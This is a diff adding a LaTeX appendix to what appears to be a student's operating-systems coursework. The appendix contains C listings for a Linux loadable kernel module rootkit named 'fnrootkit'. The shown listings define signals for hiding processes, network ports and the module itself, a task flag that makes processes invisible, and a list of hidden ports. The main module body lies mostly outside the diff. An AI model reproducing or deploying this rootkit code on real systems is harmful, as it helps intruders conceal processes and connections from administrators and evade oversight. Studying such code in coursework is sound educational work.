@@ -1,3 +1,206 @@
+\chapter*{\hfill{}ПРИЛОЖЕНИЕ А\hfill{}}%
+\label{cha:appendix1}
+\addcontentsline{toc}{chapter}{ПРИЛОЖЕНИЕ А}
+\section*{\hfill{}РЕАЛИЗАЦИЯ\hfill{}}%
+\label{sec:realizatsiia}
+\addcontentsline{toc}{section}{РЕАЛИЗАЦИЯ}
+
+\begin{lstlisting}[language=c,caption={Объявление констант и типов},label=lst:defsh]
+#ifndef OSCW_DEF_H_
+#define OSCW_DEF_H_
+
+#include <linux/syscalls.h>
+#include <linux/signal.h>
+
+enum {
+    SIGINVISPROC = SIGUSR1, // 10
+    SIGINVISPORT = SIGUSR2, // 12
+    SIGMODHIDE   = SIGRTMIN // 32
+};
+
+struct linux_dirent {
+    unsigned long	d_ino;
+    unsigned long	d_off;
+    unsigned short	d_reclen;
+    char		    d_name[1];
+};
+
+typedef asmlinkage long (*syscall_t)(const struct pt_regs *);
+
+#endif // OSCW_DEF_H_
+\end{lstlisting}
+
+\begin{lstlisting}[language=c,caption={Вспомогательные функции},label=lst:util]
+#ifndef OSCW_UTIL_H_
+#define OSCW_UTIL_H_
+
+#include <linux/types.h>
+#include <linux/kernel.h>
+
+static inline pid_t
+str_to_pid(char *str) {
+    return simple_strtoul(str, NULL, 10);
+}
+
+#endif // OSCW_UTIL_H_
+\end{lstlisting}
+
+\begin{lstlisting}[language=c,caption={Сокрытие процессов, заголовочный файл},label=lst:proc_h]
+#ifndef OSCW_PROC_H_
+#define OSCW_PROC_H_
+
+#include <linux/sched.h>
+#include <linux/proc_fs.h>
+#include <linux/proc_ns.h>
+
+#define PF_INVISIBLE 0x01000000
+
+struct task_struct *
+find_task_struct(pid_t pid);
+
+int
+is_invisible_pid(pid_t pid);
+int
+is_invisible_task_struct(struct task_struct *task);
+
+void
+toggle_proc_invisability(struct task_struct *task);
+
+#endif // OSCW_PROC_H_
+\end{lstlisting}
+
+\begin{lstlisting}[language=c,caption={Сокрытие процессов, файл реализации},label=lst:proc_c]
+#include "../inc/proc.h"
+
+#include <linux/dirent.h>
+#include <linux/fdtable.h>
+
+#include "../inc/def.h"
+#include "../inc/util.h"
+
+struct task_struct *
+find_task_struct(pid_t pid) {
+    struct task_struct *task = current;
+
+    for_each_process(task)
+        if (task->pid == pid)
+            return task;
+
+    return NULL;
+}
+
+int
+is_invisible_pid(pid_t pid) {
+    if (!pid)
+        return 0;
+    return is_invisible_task_struct(find_task_struct(pid));
+}
+
+int
+is_invisible_task_struct(struct task_struct *task) {
+    if (task)
+        return task->flags & PF_INVISIBLE;
+    return 0;
+}
+
+void
+toggle_proc_invisability(struct task_struct *task) {
+    if (task)
+        task->flags ^= PF_INVISIBLE;
+}
+\end{lstlisting}
+
+\begin{lstlisting}[language=c,caption={Сокрытие сетевых сокетов, заголовочный файл},label=lst:net_h]
+#ifndef OSCW_NET_H_
+#define OSCW_NET_H_
+
+#include <linux/in.h>
+#include <linux/in6.h>
+
+#define PROC_NET_ROW_LEN 150
+#define PROC_NET6_ROW_LEN 178
+
+struct hidden_port {
+    unsigned int port;
+    struct list_head list;
+};
+
+extern struct list_head hidden_port_list;
+
+int is_port_hidden(unsigned int port);
+
+void net_port_hide(unsigned int port);
+void net_port_show(unsigned int port);
+
+void toggle_port_invisability(unsigned int port);
+
+#endif // OSCW_NET_H_ \end{lstlisting}
+
+\begin{lstlisting}[language=c,caption={Сокрытие сетевых сокетов, файл реализации},label=lst:net_c]
+#include "../inc/net.h"
+
+void net_port_hide(unsigned int port) {
+    struct hidden_port *hp;
+
+    hp = kmalloc(sizeof(*hp), GFP_KERNEL);
+    if (!hp)
+        return;
+
+    hp->port = port;
+    list_add(&hp->list, &hidden_port_list);
+}
+
+void net_port_show(unsigned int port) {
+    struct hidden_port *hp;
+
+    list_for_each_entry (hp, &hidden_port_list, list) {
+        if (hp->port == port) {
+            list_del(&hp->list);
+            kfree(hp);
+            return;
+        }
+    }
+}
+
+int is_port_hidden(unsigned int port) {
+    struct hidden_port *hp;
+
+    list_for_each_entry (hp, &hidden_port_list, list)
+        if (hp->port == port)
+            return 1;
+
+    return 0;
+}
+
+void toggle_port_invisability(unsigned int port) {
+    if (is_port_hidden(port))
+        net_port_show(port);
+    else
+        net_port_hide(port);
+}
+\end{lstlisting}
+
+\begin{lstlisting}[language=c,caption={Загружаемый модуль ядра, заголовочный файл},label=lst:rootkit_h]
+#ifndef OSCW_FNROOTKIT_H_
+#define OSCW_FNROOTKIT_H_
+
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Faris Nabiev ICS7-73B");
+MODULE_DESCRIPTION(
+    "LKM for subject \"Operating systems\" coursework. "
+    "Implementation of a rootkit"
+);
+
+#define MODULE_NAME "fnrootkit"
+
+#endif // OSCW_FNROOTKIT_H_
+\end{lstlisting}
+
+\begin{lstlisting}[language=c,caption={Загружаемый модуль ядра, файл реализации},label=lst:rootkit_c]
 #include "../inc/fnrootkit.h"
 
 #include <linux/syscalls.h>
@@ -304,3 +507,4 @@ static void __exit fnrootkit_exit(void) {
  
 module_init(fnrootkit_init);
 module_exit(fnrootkit_exit);
+\end{lstlisting}
